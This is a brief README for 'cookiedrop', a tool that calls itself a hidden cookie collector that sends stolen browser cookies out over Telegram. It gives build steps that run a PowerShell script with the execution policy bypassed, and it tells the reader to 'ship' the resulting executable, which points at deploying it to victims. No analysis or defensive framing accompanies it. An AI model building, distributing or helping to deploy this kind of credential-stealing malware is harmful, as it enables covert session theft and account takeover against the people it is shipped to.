# cookiedrop

Hidden, dependency-free cookie collector that delivers over Telegram. See the
[master README](../README.md) for full setup, config and troubleshooting.

Quick version:

    Copy-Item config.example.json config.json
    notepad config.json
    powershell -NoP -Exec Bypass -File .\build.ps1

Ship `CookieDrop.exe`. Test with `RUN.bat` on your own machine first.